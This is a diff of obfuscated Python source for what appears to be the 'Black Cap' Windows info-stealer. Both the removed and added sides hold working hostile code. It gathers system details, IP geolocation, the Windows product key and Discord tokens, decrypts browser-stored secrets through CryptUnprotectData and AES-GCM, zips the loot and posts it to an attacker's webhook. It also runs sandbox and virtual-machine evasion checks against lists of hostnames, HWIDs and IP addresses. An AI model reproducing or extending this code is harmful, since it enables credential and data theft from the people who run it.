+HWID: {lIIlllllllIlI.llIIIIllIll}
+IP: {lIIlllllllIlI.lIIlIlIllllIIIlIIIl}
+City: {lIIlllllllIlI.IIIllllIllII}
+Country: {lIIlllllllIlI.IIlIIlIIl}
+Region: {lIIlllllllIlI.llIlIllIlIIIIll}
+Org: {lIIlllllllIlI.IIlIlIIIl}
+GoogleMaps: {lIIlllllllIlI.lIllIIll}
         """
-        with open(IIIIIIIllIllIIII.llIIIIllIIl + "\\System_Info.txt", "w", encoding="utf-8", errors='ignore') as lIIIIllIlIIIllIIl:
-            lIIIIllIlIIIllIIl.write(llIlIIlIllllllllI)
-    def llIIIlIIIIllIlIIl(IIIIIIIllIllIIII):
-        for lIIllllllIl in os.listdir(IIIIIIIllIllIIII.llIIIIllIIl):
-            if lIIllllllIl.endswith('.txt'):
-                lIllIIllI = IIIIIIIllIllIIII.llIIIIllIIl + IIIIIIIllIllIIII.lIIIllIllllII + lIIllllllIl
-                with open(lIllIIllI, "r", errors="ignore") as lIlIllIIlIII:
-                    llIllIlIllIllllll = lIlIllIIlIII.read()
-                    if not llIllIlIllIllllll:
-                        lIlIllIIlIII.close()
-                        os.remove(lIllIIllI)
+        with open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\System_Info.txt", "w", encoding="utf-8", errors='ignore') as llllIlIlll:
+            llllIlIlll.write(lIlllIllllIlIIll)
+    def IlIIIIll(lIIlllllllIlI):
+        for lIlIllllIllIlIIllII in os.listdir(lIIlllllllIlI.IllllIlIllIllIIlll):
+            if lIlIllllIllIlIIllII.endswith('.txt'):
+                lllIllIIlIlllllIIIIl = lIIlllllllIlI.IllllIlIllIllIIlll + lIIlllllllIlI.IIlllIIIlIlI + lIlIllllIllIlIIllII
+                with open(lllIllIIlIlllllIIIIl, "r", errors="ignore") as llIlIIIIIIIlll:
+                    lIllllIlIl = llIlIIIIIIIlll.read()
+                    if not lIllllIlIl:
+                        llIlIIIIIIIlll.close()
+                        os.remove(lllIllIIlIlllllIIIIl)
                     else:
-                        with open(lIllIIllI, "w", encoding="utf-8", errors="ignore") as lIIIIllIlIIIllIIl:
-                            lIIIIllIlIIIllIIl.write("Black Cap Create By KS.H | https://github.com/Kasd\n\n")
-                        with open(lIllIIllI, "a", encoding="utf-8", errors="ignore") as IlIIIIlI:
-                            IlIIIIlI.write(llIllIlIllIllllll + "\n\nasd | https://github.com/Kasd")
-        lllIIlIIllIIlllIllll = ntpath.join(IIIIIIIllIllIIII.IIllIlIlllIlI, lIIIIllIlIIIllIIl'BC-[{lIIllllllIlnlIIIIllIlIIIllIIloIlIlIIlllllIlIIlIIlllIIIom}].zip')
-        llIIIIlIlI = zipfile.ZipFile(lllIIlIIllIIlllIllll, "w", zipfile.ZIP_DEFLATED)
-        lIIlIIIIIIIIl = ntpath.abspath(IIIIIIIllIllIIII.llIIIIllIIl)
-        for lIlllllIIlIII, lIlIIlIllllllIlIIIIl, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.llIIIIllIIl):
-            for lIIIlllllIIllIII in IIllIIIIlIllIllII:
-                lIIllIIIIlIIIlllI = ntpath.abspath(ntpath.join(lIlllllIIlIII, lIIIlllllIIllIII))
-                lIIIIIlIllllIlIIIII = lIIllIIIIlIIIlllI[len(lIIlIIIIIIIIl) + 1:]
-                llIIIIlIlI.write(lIIllIIIIlIIIlllI, lIIIIIlIllllIlIIIII)
-        llIIIIlIlI.close()
-        lIllllllIlIIllI, llIllIllIlIllIlIlII, IlIlIlIlll = 0, '', ''
-        for lIlIIlIllllllIlIIIIl, IIIIlIIllIIIIlll, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.llIIIIllIIl):
-            for IlllllIIIllIIlIlI in IIllIIIIlIllIllII:
-                llIllIllIlIllIlIlII += lIIIIllIlIIIllIIl"・{IlllllIIIllIIlIlI}\n"
-                lIllllllIlIIllI += 1
-        for IIlllIIIllllIl in IIIIIIIllIllIIII.IlIlIlIlll:
-            IlIlIlIlll += lIIIIllIlIIIllIIl'{IIIIIIIlIlIIlllIIkn}\n\n'
-        IIlIIIlIIlllIIlIIllI = lIIIIllIlIIIllIIl"{lIllllllIlIIlIlIIlllIII} Files Found: "
-        llIIIlIIIIIlIIlIll = {
+                        with open(lllIllIIlIlllllIIIIl, "w", encoding="utf-8", errors="ignore") as llllIlIlll:
+                            llllIlIlll.write("Black Cap Create By KS.H | https://github.com/Kasd\n\n")
+                        with open(lllIllIIlIlllllIIIIl, "a", encoding="utf-8", errors="ignore") as IlIIlllllllIIIlllI:
+                            IlIIlllllllIIIlllI.write(lIllllIlIl + "\n\nasd | https://github.com/Kasd")
+        lllllIIIlIlllI = ntpath.join(lIIlllllllIlI.IlIlIIllIIll, llllIlIlll'BC-[{IIIIIIlIlllIIIIIllolIlllIIlIIIIIIIIlIIllIlIlllIllIIIIom}].zip')
+        IlIIlIIIlIIIIIIlI = zipfile.ZipFile(lllllIIIlIlllI, "w", zipfile.ZIP_DEFLATED)
+        IIIIlIll = ntpath.abspath(lIIlllllllIlI.IllllIlIllIllIIlll)
+        for IIllIIIllIllllI, IIllIIllllIlIIlIl, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllIlIllIllIIlll):
+            for llIIIIllIIIlI in IIllllIlllIlIlIIl:
+                IllllIIIIIl = ntpath.abspath(ntpath.join(IIllIIIllIllllI, llIIIIllIIIlI))
+                IlIIlIlIlIIllll = IllllIIIIIl[len(IIIIlIll) + 1:]
+                IlIIlIIIlIIIIIIlI.write(IllllIIIIIl, IlIIlIlIlIIllll)
+        IlIIlIIIlIIIIIIlI.close()
+        IllllIlIIIlllll, lIlllllIIIlIllllllI, IIlIlllI = 0, '', ''
+        for IIllIIllllIlIIlIl, IIllIlIlllIlllll, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllIlIllIllIIlll):
+            for IllIlIIl in IIllllIlllIlIlIIl:
+                lIlllllIIIlIllllllI += llllIlIlll"・{IllIlIIl}\n"
+                IllllIlIIIlllll += 1
+        for lIlIIlIlIIIlIIl in lIIlllllllIlI.IIlIlllI:
+            IIlIlllI += llllIlIlll'{lIllIIllIIIIlIIllIlIlllIllIIIIIkn}\n\n'
+        lIIIlllIIIllI = llllIlIlll"{lIIIIlllIlIIllIIllllIlIIlIllIlllIIlIIIIIlIIIounlIllIIllIIIIlIIllIlIlllIllIIIII} Files Found: "
+        IIIIllIllll = {
             'name': "vka",
             'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'embeds': [
                 {
                     'author': {
-                        'name': lIIIIllIlIIIllIIl'asd',
+                        'name': llllIlIlll'asd',
                         'url': 'https://github.com/asd',
                         'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                     },
                     'color': 374276,
-                    'description': lIIIIllIlIIIllIIl'[has Geo Localised this guy]({sellIIIIllIlIIIllIIl.googlIIlIlIIIlIlIIlIImllIlIlIIIIIIllIlIIIlIIlllIIp})',
+                    'description': llllIlIlll'[has Geo Localised this guy]({lIIlllllllIlI.googllllllIIIlIIllIlIlllIllIIImlIlIlIIIlIlllIlllIIp})',
                     'fields': [
                         {
                             'name': '\u200b',
-                            'value': lIIIIllIlIIIllIIl'''```fix
-                                IP: {IIIIIIIllIllIIII.lIIlllllllII.replace(" ", " ") if IIIIIIIllIllIIII.lIIlllllllII else "N/A"}
-                                Org: {IIIIIIIllIllIIII.llIlIlIlIl.replace(" ", " ") if IIIIIIIllIllIIII.llIlIlIlIl else "N/A"}
-                                City: {IIIIIIIllIllIIII.IlIlllIIlllII.replace(" ", " ") if IIIIIIIllIllIIII.IlIlllIIlllII else "N/A"}
-                                Region: {IIIIIIIllIllIIII.IIlIIIIll.replace(" ", " ") if IIIIIIIllIllIIII.IIlIIIIll else "N/A"}
-                                Country: {IIIIIIIllIllIIII.IlllIIIlll.replace(" ", " ") if IIIIIIIllIllIIII.IlllIIIlll else "N/A"}```
+                            'value': llllIlIlll'''```fix
+                                IP: {lIIlllllllIlI.lIIlIlIllllIIIlIIIl.replace(" ", " ") if lIIlllllllIlI.lIIlIlIllllIIIlIIIl else "N/A"}
+                                Org: {lIIlllllllIlI.IIlIlIIIl.replace(" ", " ") if lIIlllllllIlI.IIlIlIIIl else "N/A"}
+                                City: {lIIlllllllIlI.IIIllllIllII.replace(" ", " ") if lIIlllllllIlI.IIIllllIllII else "N/A"}
+                                Region: {lIIlllllllIlI.llIlIllIlIIIIll.replace(" ", " ") if lIIlllllllIlI.llIlIllIlIIIIll else "N/A"}
+                                Country: {lIIlllllllIlI.IIlIIlIIl.replace(" ", " ") if lIIlllllllIlI.IIlIIlIIl else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
-                            'value': lIIIIllIlIIIllIIl'''```fix
-                                Computer Name: {IIIlIlIllIIIlIIIlII.replace(" ", " ")}
-                                Windows Key: {IIIIIIIllIllIIII.IlIlIlIlI.replace(" ", " ")}
-                                Windows Ver: {IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII.replace(" ", " ")}
-                                Disk Stockage: {IIlllIIl}GB
-                                Ram Stockage: {IllIllIIIlll}GB```
+                            'value': llllIlIlll'''```fix
+                                Computer Name: {IIIIlIIIIIlllIIlIlI.replace(" ", " ")}
+                                Windows Key: {lIIlllllllIlI.IIIIIIlIllI.replace(" ", " ")}
+                                Windows Ver: {lIIlllllllIlI.lIlIlllIIlII.replace(" ", " ")}
+                                Disk Stockage: {llIIIlIIlIlIlIIIIlll}GB
+                                Ram Stockage: {llllIlll}GB```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**- Tokens:**',
-                            'value': lIIIIllIlIIIllIIl'''```yaml
-                                {IlIlIlIlll if IlIlIlIlll else "tokens not found"}```
+                            'value': llllIlIlll'''```yaml
+                                {IIlIlllI if IIlIlllI else "tokens not found"}```
                             '''.replace(' ', ''),
                             'inline': False
                         },
                         {
-                            'name': IIlIIIlIIlllIIlIIllI,
-                            'value': lIIIIllIlIIIllIIl'''```ini
+                            'name': lIIIlllIIIllI,
+                            'value': llllIlIlll'''```ini
                                 [
-                                {llIllIllIlIllIlIlII.strip()}
+                                {lIlllllIIIlIllllllI.strip()}
                                 ]```
                             '''.replace(' ', ''),
                             'inline': False
@@ -1234,16 +925,16 @@ GoogleMaps: {IIIIIIIllIllIIII.llIIIllllIIll}
                 }
             ]
         }
-        with open(lllIIlIIllIIlllIllll, 'rb') as lIIIIllIlIIIllIIl:
-            if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
-                httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=llIIIlIIIIIlIIlIll)
-                httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, IIllIIIIlIllIllII={'upload_file': lIIIIllIlIIIllIIl})
-        os.remove(lllIIlIIllIIlllIllll)
-class IlIIllIlI(lIlIIIllIII):
-    IlIllllIIIIIII = False
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IIIIIlIIllIIII = list()
-        IIIIIIIllIllIIII.IIllIIllI = [
+        with open(lllllIIIlIlllI, 'rb') as llllIlIlll:
+            if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
+                httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=IIIIllIllll)
+                httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, IIllllIlllIlIlIIl={'upload_file': llllIlIlll})
+        os.remove(lllllIIIlIlllI)
+class IIIIIlIIIllIlIllIIlI(IIlIlIllIlI):
+    lllllllI = False
+    def __init__(lIIlllllllIlI):
+        lIIlllllllIlI.IIIIllll = list()
+        lIIlllllllIlI.lllIlIlllIllllI = [
             "05h00Gi0",
             "3u2v9m8",
             "43By4",
@@ -1370,7 +1061,7 @@ class IlIIllIlI(lIlIIIllIII):
             "Administrator",
             "katorres"
         ]
-        IIIIIIIllIllIIII.llIlIIII = [
+        lIIlllllllIlI.lIlllllll = [
              "00900BC83803",
              "0CC47AC83803",
              "6C4E733F-C2D9-4",
@@ -1566,7 +1257,7 @@ class IlIIllIlI(lIlIIIllIII):
              "WINZDS-PU0URPVI",
              "ABIGAI",
         ]
-        IIIIIIIllIllIIII.lIIIllllllIIIIIlllll = [
+        lIIlllllllIlI.IlllIlIIllllllIIlI = [
              "00000000-0000-0000-0000-000000000000",
              "00000000-0000-0000-0000-50E5493391EF",
              "00000000-0000-0000-0000-AC1F6BD047A0",
@@ -1821,7 +1512,7 @@ class IlIIllIlI(lIlIIIllIII):
              "074B2042-8EF0-B1EA-B32B-DEDCD4CED0D8",
              "B381F3F2-BEDC-4B70-B80A-1B6AF4977159"
         ]
-        IIIIIIIllIllIIII.IIIIIIllIlIIllll = [   
+        lIIlllllllIlI.IIlIlIllIl = [   
              "10.200.169.204",
              "104.198.155.173",
              "109.145.173.169",
@@ -1985,149 +1676,149 @@ class IlIIllIlI(lIlIIIllIII):
              "194.154.78.169",
              "52.250.30.131"
              ]
-        for IlllIlIIlIlIll in [IIIIIIIllIllIIII.IIlIIIlIl, IIIIIIIllIllIIII.lIllIIIIIIlIlIllI, IIIIIIIllIllIIII.IIlllllIlIlllllIIl]:
-            IllllIIllIlIlI = threading.Thread(IIllIIlIlllII=IlllIlIIlIlIll, daemon=True)
-            IIIIIIIllIllIIII.IIIIIlIIllIIII.append(IllllIIllIlIlI)
-            IllllIIllIlIlI.start()
-        for IIIIIIIll in IIIIIIIllIllIIII.IIIIIlIIllIIII:
+        for lllIIllI in [lIIlllllllIlI.IllIIlllIlIIIlIlIll, lIIlllllllIlI.llIIIIlIll, lIIlllllllIlI.lIlIlIlIIl]:
+            IIlIIlllII = threading.Thread(llIlIIllIIIl=lllIIllI, daemon=True)
+            lIIlllllllIlI.IIIIllll.append(IIlIIlllII)
+            IIlIIlllII.start()
+        for lIllIIllIlIIII in lIIlllllllIlI.IIIIllll:
             try:
-                IIIIIIIll.join()
+                lIllIIllIlIIII.join()
             except RuntimeError:
                 continue
-    def IlIllIlI(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.__class__.IlIllllIIIIIII = True
-    def IIlIIIlIl(IIIIIIIllIllIIII):
-        for lIllIIllI in [IIlllIIlIlIlI'D:\Tools', IIlllIIlIlIlI'D:\OS2', IIlllIIlIlIlI'D:\NT3X']:
-            if ntpath.exists(lIllIIllI):
-                IIIIIIIllIllIIII.IlIllIlI()
-        for IIIllIlIIIlIlIIIIllI in IIIIIIIllIllIIII.IIllIIllI:
-            if lIlllIIIlIlllIIIlIIl == IIIllIlIIIlIlIIIIllI:
-                IIIIIIIllIllIIII.IlIllIlI()
-        for IlllIlIlIIlllIlIl in IIIIIIIllIllIIII.llIlIIII:
-            if IIIlIlIllIIIlIIIlII == IlllIlIlIIlllIlIl:
-                IIIIIIIllIllIIII.IlIllIlI()
-        for lIIlIIllIIIIIlllIll in IIIIIIIllIllIIII.IIIIIIllIlIIllll:
-            if IIIIIIIllIllIIII.llllIllIIllllIllIIl()[0] == lIIlIIllIIIIIlllIll:
-                IIIIIIIllIllIIII.IlIllIlI()
-        for IIIllIIIlIIlIIlIll in IIIIIIIllIllIIII.lIIIllllllIIIIIlllll:
-            if IIIIIIIllIllIIII.IlllIlll()[0] == IIIllIIIlIIlIIlIll:
-                IIIIIIIllIllIIII.IlIllIlI()
-    def IIlllllIlIlllllIIl(IIIIIIIllIllIIII):
-        if int(IllIllIIIlll) <= 3: 
-            IIIIIIIllIllIIII.IlIllIlI()
-        if int(IIlllIIl) <= 120:  
-            IIIIIIIllIllIIII.IlIllIlI()
+    def IllIlIIlIlIlll(lIIlllllllIlI):
+        lIIlllllllIlI.__class__.lllllllI = True
+    def IllIIlllIlIIIlIlIll(lIIlllllllIlI):
+        for lllIllIIlIlllllIIIIl in [IlIIllIll'D:\Tools', IlIIllIll'D:\OS2', IlIIllIll'D:\NT3X']:
+            if ntpath.exists(lllIllIIlIlllllIIIIl):
+                lIIlllllllIlI.IllIlIIlIlIlll()
+        for IlIlIIIlIll in lIIlllllllIlI.lllIlIlllIllllI:
+            if lIIllIllII == IlIlIIIlIll:
+                lIIlllllllIlI.IllIlIIlIlIlll()
+        for llllllllIIIIIlI in lIIlllllllIlI.lIlllllll:
+            if IIIIlIIIIIlllIIlIlI == llllllllIIIIIlI:
+                lIIlllllllIlI.IllIlIIlIlIlll()
+        for lIIllllllIIlllIlllll in lIIlllllllIlI.IIlIlIllIl:
+            if lIIlllllllIlI.llllIIlI()[0] == lIIllllllIIlllIlllll:
+                lIIlllllllIlI.IllIlIIlIlIlll()
+        for llIIIIllIll in lIIlllllllIlI.IlllIlIIllllllIIlI:
+            if lIIlllllllIlI.lIIlIllIII()[0] == llIIIIllIll:
+                lIIlllllllIlI.IllIlIIlIlIlll()
+    def lIlIlIlIIl(lIIlllllllIlI):
+        if int(llllIlll) <= 3: 
+            lIIlllllllIlI.IllIlIIlIlIlll()
+        if int(llIIIlIIlIlIlIIIIlll) <= 120:  
+            lIIlllllllIlI.IllIlIIlIlIlll()
         if int(psutil.cpu_count()) <= 1:
-            IIIIIIIllIllIIII.IlIllIlI()
-    def lIllIIIIIIlIlIllI(IIIIIIIllIllIIII):
-        IIIIlIIllIlIIllIIIII = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
-        llIlIlIIlIIlIIllIII = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
-        if (IIIIlIIllIlIIllIIIII and llIlIlIIlIIlIIllIII) != 1:
-            IIIIIIIllIllIIII.IlIllIlI()
-        llIIlIIlIlIlIlIIIlI = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+            lIIlllllllIlI.IllIlIIlIlIlll()
+    def llIIIIlIll(lIIlllllllIlI):
+        IIIIlIIlllIlIIl = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
+        IlIlIIlIIllIlIIl = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
+        if (IIIIlIIlllIlIIl and IlIlIIlIIllIlIIl) != 1:
+            lIIlllllllIlI.IllIlIIlIlIlll()
+        lIIIIllllIIIIl = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
         try:
-            lIllIlIIIIIIIlllII = winreg.QueryValueEx(llIIlIIlIlIlIlIIIlI, '0')[0]
-            if ("VMware" or "VBOX") in lIllIlIIIIIIIlllII:
-                IIIIIIIllIllIIII.IlIllIlI()
+            IlllIIIlllIlIllIlII = winreg.QueryValueEx(lIIIIllllIIIIl, '0')[0]
+            if ("VMware" or "VBOX") in IlllIIIlllIlIllIlII:
+                lIIlllllllIlI.IllIlIIlIlIlll()
         finally:
-            winreg.CloseKey(llIIlIIlIlIlIlIIIlI)
-if __name__ == "__main__" and os.IllIlIIlIIllIlIIlIl == "nt":
-    asyncio.IIIIlIlIIIIl(IllIIllIllIIIlIlIIl().lIlIlIlIIllIlIllIIl())
-IllIIlIIIIllIlllIll = os.getenv('LOCALAPPDATA')
-IIIllIIllIlllIlllII = os.getenv('APPDATA')
-IllIIlIllIllIIII = os.getenv("TEMP")
-llIIIlIIIIlIlIIll = []
-def lllllIIIll(IIlIlIIIlIlIIlII: str) -> str or bool | None:
-        return IlIIlllIIllIIllI.get(IIlIlIIIlIlIIlII)
-IllIIIlIll = lllllIIIll("yourwebhookurl")
-class IIlIlllll(Structure):
-    IlIllllllI = [
+            winreg.CloseKey(lIIIIllllIIIIl)
+if __name__ == "__main__" and os.lIIlllIlIlIIlII == "nt":
+    asyncio.lllIIlIlI(llllIllIlllIIIlIl().IlIlIllllIIIlI())
+IlllIIlIIlllI = os.getenv('LOCALAPPDATA')
+IllllllI = os.getenv('APPDATA')
+lIIllIlIlIIIIIlIII = os.getenv("TEMP")
+lIlIIlIlIllIlIll = []
+def lIllllIIIllIIllIIll(llllllII: str) -> str or bool | None:
+        return IllllllllIIlIIlll.get(llllllII)
+lIIlIIllIIIIIIl = lIllllIIIllIIllIIll("yourwebhookurl")
+class IIIIlIlIllllllIIl(Structure):
+    lIlIllIIllllIIlllII = [
         ('cbData', wintypes.DWORD),
         ('pbData', POINTER(c_char))
     ]
-def IlIllIIIIlIllIIlIII(llIllIlllIIl):
-    llllIIIllIlIIl = int(llIllIlllIIl.llllIIIllIlIIl)
-    IlIllIIllllIIlll = llIllIlllIIl.IlIllIIllllIIlll
-    IlIIlIIlI = c_buffer(llllIIIllIlIIl)
-    cdll.msvcrt.memcpy(IlIIlIIlI, IlIllIIllllIIlll, llllIIIllIlIIl)
-    windll.kernel32.LocalFree(IlIllIIllllIIlll)
-    return IlIIlIIlI.raw
-def llIIllIlIllIIlIIll(lllIllIl, IlIIIlllIlllIlI=llIlIIIllll''):
-    llllllllIlllIIIIlII = c_buffer(lllIllIl, len(lllIllIl))
-    lIlIIlIl = c_buffer(IlIIIlllIlllIlI, len(IlIIIlllIlllIlI))
-    IlllIIIIlIIlIlII = IIlIlllll(len(lllIllIl), llllllllIlllIIIIlII)
-    IIIlIIlllIlllIIIlIlI = IIlIlllll(len(IlIIIlllIlllIlI), lIlIIlIl)
-    llIllIlllIIl = IIlIlllll()
-    if windll.crypt32.llIIllIlIllIIlIIll(byref(IlllIIIIlIIlIlII), None, byref(IIIlIIlllIlllIIIlIlI), None, None, 0x01, byref(llIllIlllIIl)):
-        return IlIllIIIIlIllIIlIII(llIllIlllIIl)
-def IlIIlIIIIIlll(llllIllIllIllIIllI, lllIIIlIlIlIIllI=None):
-    llIlIIlIlIllI = llllIllIllIllIIllI.decode(encoding='utf8', errors='ignore')[:3]
-    if llIlIIlIlIllI == 'v10' or llIlIIlIlIllI == 'v11':
-        IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
-        llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
-        llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
-        lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
-        lllIIlll = lllIIlll[:-16].decode()
-        return lllIIlll
-def lIllllIlllllIIllII(lIlllIlIl, llIlIlIlIIIIIIIIIl, IlIlIlIllllIlIIlII='', files='', headers=''):
-    for lIIllllllIl in range(8):
+def IIIlllIllIlllllllIll(IlIlllIllIIIIlI):
+    IlllIIIIlIlIlIIlIIl = int(IlIlllIllIIIIlI.IlllIIIIlIlIlIIlIIl)
+    lIIIIllIlIl = IlIlllIllIIIIlI.lIIIIllIlIl
+    IIIIlIlIIlIII = c_buffer(IlllIIIIlIlIlIIlIIl)
+    cdll.msvcrt.memcpy(IIIIlIlIIlIII, lIIIIllIlIl, IlllIIIIlIlIlIIlIIl)
+    windll.kernel32.LocalFree(lIIIIllIlIl)
+    return IIIIlIlIIlIII.raw
+def lIIIlllllI(llIIlIIIlllIIlllII, lllIllIIlIlIlll=lllllIllIIIl''):
+    lIIIlIIlIlIlI = c_buffer(llIIlIIIlllIIlllII, len(llIIlIIIlllIIlllII))
+    IIIlllIIIIIlIIlIlI = c_buffer(lllIllIIlIlIlll, len(lllIllIIlIlIlll))
+    llllIlIllllll = IIIIlIlIllllllIIl(len(llIIlIIIlllIIlllII), lIIIlIIlIlIlI)
+    lllIIlIIllllIIllllll = IIIIlIlIllllllIIl(len(lllIllIIlIlIlll), IIIlllIIIIIlIIlIlI)
+    IlIlllIllIIIIlI = IIIIlIlIllllllIIl()
+    if windll.crypt32.lIIIlllllI(byref(llllIlIllllll), None, byref(lllIIlIIllllIIllllll), None, None, 0x01, byref(IlIlllIllIIIIlI)):
+        return IIIlllIllIlllllllIll(IlIlllIllIIIIlI)
+def IlllIIllllIlIllIlIlI(IllIlIIIIIIlll, IIlIllIllIIlIII=None):
+    lIIlIlIIIll = IllIlIIIIIIlll.decode(encoding='utf8', errors='ignore')[:3]
+    if lIIlIlIIIll == 'v10' or lIIlIlIIIll == 'v11':
+        IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
+        llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
+        IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
+        IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
+        IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
+        return IIIlllIllIlIIllll
+def llIIIlIllIlI(IIIlIlIIlIlIII, lIIlllllIIIlIlIIlIl, lIlIIIllIIlI='', files='', headers=''):
+    for lIlIllllIllIlIIllII in range(8):
         try:
-            if lIlllIlIl == 'POST':
-                if IlIlIlIllllIlIIlII != '':
-                    IIlllIIlIlIlI = requests.post(llIlIlIlIIIIIIIIIl, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII)
-                    if IIlllIIlIlIlI.status_code == 200:
-                        return IIlllIIlIlIlI
-                elif IIllIIIIlIllIllII != '':
-                    IIlllIIlIlIlI = requests.post(llIlIlIlIIIIIIIIIl, IIllIIIIlIllIllII=IIllIIIIlIllIllII)
-                    if IIlllIIlIlIlI.status_code == 200 or IIlllIIlIlIlI.status_code == 413: 
-                        return IIlllIIlIlIlI
+            if IIIlIlIIlIlIII == 'POST':
+                if lIlIIIllIIlI != '':
+                    IlIIllIll = requests.post(lIIlllllIIIlIlIIlIl, lIlIIIllIIlI=lIlIIIllIIlI)
+                    if IlIIllIll.status_code == 200:
+                        return IlIIllIll
+                elif IIllllIlllIlIlIIl != '':
+                    IlIIllIll = requests.post(lIIlllllIIIlIlIIlIl, IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
+                    if IlIIllIll.status_code == 200 or IlIIllIll.status_code == 413: 
+                        return IlIIllIll
         except:
             pass
-def lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII='', files='', headers=''):
-    for lIIllllllIl in range(8):
+def IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI='', files='', headers=''):
+    for lIlIllllIllIlIIllII in range(8):
         try:
-            if IIllIlIIlIIl != '':
-                IIlllIIlIlIlI = urlopen(Request(IllIIIlIll, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII, IIllIlIIlIIl=IIllIlIIlIIl))
-                return IIlllIIlIlIlI
+            if IlIIllIIIl != '':
+                IlIIllIll = urlopen(Request(lIIlIIllIIIIIIl, lIlIIIllIIlI=lIlIIIllIIlI, IlIIllIIIl=IlIIllIIIl))
+                return IlIIllIll
             else:
-                IIlllIIlIlIlI = urlopen(Request(IllIIIlIll, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII))
-                return IIlllIIlIlIlI
+                IlIIllIll = urlopen(Request(lIIlIIllIIIIIIl, lIlIIIllIIlI=lIlIIIllIIlI))
+                return IlIIllIll
         except:
             pass
-def IIlIllllll(llIlIIllllI):
-    global IllIlIlllIIl
-    IlIlIlIllllIlIIlII = str(llIlIIllllI)
-    IIlIllIIIllI = re.findall(".google.com", IlIlIlIllllIlIIlII)
-    if len(IIlIllIIIllI) < -1:
-        IllIlIlllIIl = True
-        return IllIlIlllIIl
+def lIlIlIllllIlllIIIII(llIIllIIIllI):
+    global IllllIllIIIIlllII
+    lIlIIIllIIlI = str(llIIllIIIllI)
+    IIllIIlIIllllIll = re.findall(".google.com", lIlIIIllIIlI)
+    if len(IIllIIlIIllllIll) < -1:
+        IllllIllIIIIlllII = True
+        return IllllIllIIIIlllII
     else:
-        IllIlIlllIIl = False
-        return IllIlIlllIIl
-def llllIIIl(IIIlIIIlllllIll):
-    IIlIlIIIlIlIIlII = re.findall("(\w+[a-z])",IIIlIIIlllllIll)
-    while "https" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("https")
-    while "com" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("com")
-    while "net" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("net")
-    return list(set(IIlIlIIIlIlIIlII))
-def IIllIlIlIlI(IllIlIIlIIllIlIIlIl, lIIlIlIIllllIIlll=''):
-    IIllIlIIlIIl = {
+        IllllIllIIIIlllII = False
+        return IllllIllIIIIlllII
+def IlllIIIIllllI(lIIllIlIIIIlllI):
+    llllllII = re.findall("(\w+[a-z])",lIIllIlIIIIlllI)
+    while "https" in llllllII: llllllII.remove("https")
+    while "com" in llllllII: llllllII.remove("com")
+    while "net" in llllllII: llllllII.remove("net")
+    return list(set(llllllII))
+def IllIIlIlIIllIIIlI(lIIlllIlIlIIlII, lIlIllIIlIlIIIIIlII=''):
+    IlIIllIIIl = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-    if IllIlIIlIIllIlIIlIl == "bc_checking":
-        IlIlIlIllllIlIIlII = {
+    if lIIlllIlIlIIlII == "bc_checking":
+        lIlIIIllIIlI = {
         "content": '',
         "embeds": [
             {
             "fields": [
                 {
